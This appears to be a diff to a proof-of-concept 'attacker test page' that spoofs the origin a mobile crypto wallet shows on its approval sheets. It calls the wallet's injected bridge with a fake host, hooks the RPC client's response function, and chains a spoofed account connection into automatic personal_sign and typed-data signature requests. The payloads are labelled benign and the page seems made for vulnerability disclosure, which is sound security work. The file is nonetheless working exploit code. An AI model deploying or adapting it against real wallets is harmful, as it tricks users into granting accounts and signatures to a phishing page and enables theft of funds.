@@ -3,62 +3,230 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Bridge Origin Test</title>
+<title>Ult Security</title>
 <style>
-body{font-family:system-ui;background:#0b1220;color:#e8eefc;margin:0;padding:24px}
-.box{background:#141d33;border-radius:12px;padding:16px;margin-bottom:14px}
-#real{word-break:break-all}
-button{width:100%;padding:14px;border:0;border-radius:10px;font-size:16px;background:#4cdbff;color:#001;font-weight:700}
-button.alt{background:#ffd54d;margin-top:10px}
+body{font-family:system-ui;background:#0b1220;color:#e8eefc;margin:0;padding:16px}
+.box{background:#141d33;border-radius:12px;padding:12px;margin-bottom:12px}
+.warn{border:2px solid #ff5470}
+.real{word-break:break-all;color:#ffd54d;font-weight:700}
+button{width:100%;padding:16px;border:0;border-radius:12px;font-size:17px;background:#4cdbff;color:#001;font-weight:700;margin-bottom:10px}
+button.alt{background:#ffd54d}
+button.neg{background:#ffb3b3}
+button.big{background:#37ff8b;font-size:19px;padding:20px}
+.step{font-size:16px;margin:8px 0}
+.ok{color:#37ff8b;font-weight:700}
+.err{color:#ff5470;font-weight:700}
+.wait{color:#8fa3c8}
+#sig{background:#052e16;border:2px solid #37ff8b;border-radius:12px;padding:14px;display:none;margin-bottom:12px}
+#sig h2{color:#37ff8b;margin:0 0 8px 0;font-size:20px}
+#sigtxt{word-break:break-all;font-family:monospace;font-size:13px;color:#b8ffd0}
+#log{font-family:monospace;font-size:11px;color:#8fa3c8;word-break:break-all;max-height:220px;overflow-y:auto;background:#0a0f1e;border-radius:8px;padding:8px}
 small{color:#8fa3c8}
+h1{font-size:20px;margin:0 0 10px 0}
 </style>
 </head>
 <body>
-<div class="box">
-<b>REAL page origin:</b>
-<div id="real"></div>
-<small>This page is hosted on a third-party test domain. Any approval sheet that appears below should display THIS origin if the wallet validates it correctly.</small>
+<div class="box warn">
+<h1>ATTACKER TEST PAGE (PoC)</h1>
+<div>REAL page origin (what the browser URL bar belongs to):</div>
+<div class="real" id="real">loading...</div>
+<small>Every wallet sheet triggered from this page will display the ORIGIN I PASS TO THE BRIDGE, not the origin above. The pages below pass <b>https://app.ult.trade</b>.</small>
 </div>
-<button onclick="callBridge()">Request accounts (spoofed host: app.ult.trade)</button>
-<button class="alt" onclick="callBridgeSign()">Send tx (spoofed host: app.ult.trade)</button>
-<button class="alt" style="background:#9be29b" onclick="callBridgeNeg()">NEG control: request with REAL host</button>
-<button class="alt" style="background:#ffb3b3" onclick="readAccounts()">Read accounts granted to THIS page</button>
-<div class="box" id="out" style="display:none"></div>
+
+<div class="box">
+<div class="step" id="bridge">bridge: checking...</div>
+<div class="step">message to sign (benign): <b>ULT-DL-05 benign security test - no funds - no transaction</b></div>
+</div>
+
+<div id="sig">
+<h2>SIGNATURE DELIVERED TO THIS (ATTACKER) PAGE</h2>
+<div id="sigtxt"></div>
+</div>
+
+<button class="big" onclick="runChain()">RUN FULL CHAIN: spoofed connect + auto spoofed sign</button>
+<button class="alt" onclick="spoofConnect()">spoofed connect only</button>
+<button class="alt" onclick="spoofSign()">spoofed personal_sign only</button>
+<button class="alt" onclick="spoofTyped()">spoofed eth_signTypedData_v4 only</button>
+<button class="neg" onclick="negSign()">NEG control: personal_sign with REAL host</button>
+
+<div class="box">
+<div class="step" id="s1">STEP 1 spoofed connect (eth_requestAccounts, host=app.ult.trade): <span class="wait">idle</span></div>
+<div class="step" id="s2">STEP 2 spoofed sign (personal_sign, host=app.ult.trade): <span class="wait">idle</span></div>
+</div>
+
+<div class="box"><div>bridge event log:</div><div id="log"></div></div>
+
 <script>
+var SPOOF = 'https://app.ult.trade';
+var TITLE = 'Ult Security';
+var CID = 777101, SID = 777202, NID = 777303, TID = 777404;
+var MSG = 'ULT-DL-05 benign security test - no funds - no transaction';
+var account = '';
+
 document.getElementById('real').textContent = location.origin || location.href;
-function show(s){var o=document.getElementById('out');o.style.display='block';o.textContent=s}
-function callBridge(){
-  var json = {id: Date.now()%100000, jsonrpc:"2.0", name:"eth_requestAccounts", object:{}};
-  try{
-    window._tw_.evmMessage("Ult Security", "https://app.ult.trade", JSON.stringify(json), "0x1");
-    show("called _tw_.evmMessage with host=https://app.ult.trade");
-  }catch(e){ show("bridge error: "+e) }
+
+function log(s){
+  var d = document.createElement('div');
+  d.textContent = new Date().toLocaleTimeString() + ' ' + s;
+  var L = document.getElementById('log');
+  L.appendChild(d); L.scrollTop = L.scrollHeight;
 }
-function callBridgeSign(){
-  var json = {id: Date.now()%100000+1, jsonrpc:"2.0", name:"eth_sendTransaction",
-    object:{chainId:"0x1"},
-    to:"0x000000000000000000000000000000000000dEaD",
-    value:"0x0", data:"0x"};
-  try{
-    window._tw_.evmMessage("Ult Security", "https://app.ult.trade", JSON.stringify(json), "0x1");
-    show("called _tw_.evmMessage (sendTransaction) with host=https://app.ult.trade");
-  }catch(e){ show("bridge error: "+e) }
+function step(n, cls, txt){
+  var e = document.getElementById('s' + n);
+  e.innerHTML = (n==1?'STEP 1 spoofed connect (eth_requestAccounts, host=app.ult.trade): '
+    :'STEP 2 spoofed sign (personal_sign, host=app.ult.trade): ') + '<span class="' + cls + '">' + txt + '</span>';
 }
-function callBridgeNeg(){
-  var json = {id: Date.now()%100000+2, jsonrpc:"2.0", name:"eth_requestAccounts", object:{}};
+function toHex(t){
+  var h = '';
+  for (var i = 0; i < t.length; i++){
+    var c = t.charCodeAt(i).toString(16);
+    h += (c.length < 2 ? '0' : '') + c;
+  }
+  return '0x' + h;
+}
+var MSGHEX = toHex(MSG);
+
+function chainIdStr(){
+  try { return window.cdc_wallet.ethereum.chainId || '0x1'; } catch(e){ return '0x1'; }
+}
+function evmCall(id, method, params, host, title){
+  var json = {id: id, jsonrpc: '2.0', method: method, params: params};
+  try{
+    window._tw_.evmMessage(title, host, JSON.stringify(json), chainIdStr());
+    log('SENT -> _tw_.evmMessage(title=' + title + ', host=' + host + ') ' + method + ' id=' + id);
+    return true;
+  }catch(e){
+    log('bridge error: ' + e);
+    step(1, 'err', 'bridge error');
+    return false;
+  }
+}
+
+var hooked = false;
+function hookResponses(){
+  if (hooked) return true;
+  try{
+    var rc = window.cdc_wallet.evmRpcClient;
+    var orig = rc.sendResponse;
+    var rcSelf = rc;
+    rc.sendResponse = function(t){
+      try{ onResp(t); }catch(e){ log('handler err ' + e); }
+      return orig.call(rcSelf, t);
+    };
+    hooked = true;
+    log('hooked evmRpcClient.sendResponse');
+    return true;
+  }catch(e){
+    log('hook failed: ' + e);
+    return false;
+  }
+}
+
+var waitTries = 0;
+function waitBridge(){
+  var okTw = !!(window._tw_ && window._tw_.evmMessage);
+  okTw ? null : null;
+  var okCdc = false;
+  try { okCdc = !!(window.cdc_wallet && window.cdc_wallet.evmRpcClient && window.cdc_wallet.evmRpcClient.sendResponse); } catch(e){}
+  if (okTw && okCdc && hookResponses()){
+    document.getElementById('bridge').innerHTML =
+      'bridge: <span class="ok">READY</span> (_tw_ + cdc_wallet injected) | chainId ' + chainIdStr();
+    return;
+  }
+  waitTries++;
+  if (waitTries > 240){
+    document.getElementById('bridge').innerHTML = 'bridge: <span class="err">NOT AVAILABLE after 60s</span> (_tw_=' + okTw + ' cdc=' + okCdc + ')';
+    return;
+  }
+  setTimeout(waitBridge, 250);
+}
+waitBridge();
+
+function onResp(t){
+  log('RECEIVED <- ' + JSON.stringify(t));
+  if (t && t.id === CID){
+    if (t.result && Object.prototype.toString.call(t.result) === '[object Array]'){
+      account = t.result[0] || '';
+      step(1, 'ok', 'APPROVED. accounts delivered to this page: ' + (account || '(empty list)'));
+      if (window.__auto){
+        setTimeout(function(){
+          step(2, 'wait', 'request sent - approval sheet should now show ' + SPOOF);
+          evmCall(SID, 'personal_sign', [MSGHEX, account], SPOOF, TITLE);
+        }, 700);
+      }
+    } else {
+      step(1, 'err', 'REJECTED / error: ' + JSON.stringify(t.error || t.result));
+      window.__auto = false;
+    }
+  } else if (t && t.id === SID){
+    if (typeof t.result === 'string' && t.result.indexOf('0x') === 0){
+      step(2, 'ok', 'APPROVED. signature delivered to this page.');
+      showSig(t.result, SPOOF);
+    } else {
+      step(2, 'err', 'REJECTED / error: ' + JSON.stringify(t.error || t.result));
+    }
+  } else if (t && t.id === NID){
+    if (typeof t.result === 'string' && t.result.indexOf('0x') === 0){
+      showSig(t.result, location.origin + ' (REAL origin - NEG control)');
+      log('NEG control result: signature ' + t.result);
+    } else {
+      log('NEG control rejected/error: ' + JSON.stringify(t.error || t.result));
+    }
+  } else if (t && t.id === TID){
+    if (typeof t.result === 'string' && t.result.indexOf('0x') === 0){
+      showSig(t.result, SPOOF + ' (eth_signTypedData_v4)');
+    } else {
+      log('typed-v4 rejected/error: ' + JSON.stringify(t.error || t.result));
+    }
+  }
+}
+
+function showSig(sig, originLabel){
+  document.getElementById('sigtxt').textContent =
+    'signed message: "' + MSG + '"\n\nsignature:\n' + sig +
+    '\n\nwallet sheet displayed origin: ' + originLabel +
+    '\nreal origin of THIS page: ' + (location.origin || location.href);
+  document.getElementById('sig').style.display = 'block';
+  document.getElementById('sig').scrollIntoView({behavior: 'smooth'});
+  log('SIGNATURE ON PAGE: ' + sig);
+}
+
+function runChain(){
+  if (!hookResponses()){ log('bridge not ready'); return; }
+  window.__auto = true;
+  step(1, 'wait', 'request sent - approval sheet should now show ' + SPOOF);
+  step(2, 'wait', 'auto-fires after connect is approved');
+  evmCall(CID, 'eth_requestAccounts', [], SPOOF, TITLE);
+}
+function spoofConnect(){
+  window.__auto = false;
+  step(1, 'wait', 'request sent - sheet should show ' + SPOOF);
+  evmCall(CID, 'eth_requestAccounts', [], SPOOF, TITLE);
+}
+function spoofSign(){
+  window.__auto = false;
+  step(2, 'wait', 'request sent - sheet should show ' + SPOOF);
+  evmCall(SID, 'personal_sign', [MSGHEX, account], SPOOF, TITLE);
+}
+function spoofTyped(){
+  var typed = {
+    types: {
+      EIP712Domain: [{name: 'name', type: 'string'}, {name: 'version', type: 'string'}, {name: 'chainId', type: 'uint256'}],
+      Mail: [{name: 'from', type: 'string'}, {name: 'contents', type: 'string'}]
+    },
+    primaryType: 'Mail',
+    domain: {name: 'ULT-DL-05 benign test', version: '1', chainId: parseInt(chainIdStr(), 16)},
+    message: {from: 'security-test', contents: 'benign - no funds - no transaction'}
+  };
+  window.__auto = false;
+  step(2, 'wait', 'typed-v4 request sent - sheet should show ' + SPOOF);
+  evmCall(TID, 'eth_signTypedData_v4', [account || '0x0000000000000000000000000000000000000000', JSON.stringify(typed)], SPOOF, TITLE);
+}
+function negSign(){
+  if (!hookResponses()){ log('bridge not ready'); return; }
   var real = location.protocol + '//' + location.host;
-  try{
-    window._tw_.evmMessage("Real Origin", real, JSON.stringify(json), "0x1");
-    show("NEG control: called with host=" + real);
-  }catch(e){ show("bridge error: "+e) }
-}
-function readAccounts(){
-  try{
-    var p = window.cdc_wallet && (window.cdc_wallet.request || (window.cdc_wallet.ethereum && window.cdc_wallet.ethereum.request));
-    if(!p){ show('no EIP-1193 provider on this page (connection not established)'); return }
-    p({method:'eth_accounts'}).then(function(a){ show('ACCOUNTS GRANTED TO THIS PAGE (obtained under spoofed origin): ' + JSON.stringify(a)) })
-      .catch(function(e){ show('eth_accounts error: ' + (e && (e.message||e.toString()) || e) ) });
-  }catch(e){ show('read error: '+e) }
+  log('NEG control: sending personal_sign with the REAL host ' + real);
+  evmCall(NID, 'personal_sign', [MSGHEX, account], real, 'Real Origin');
 }
 </script>
 </body>
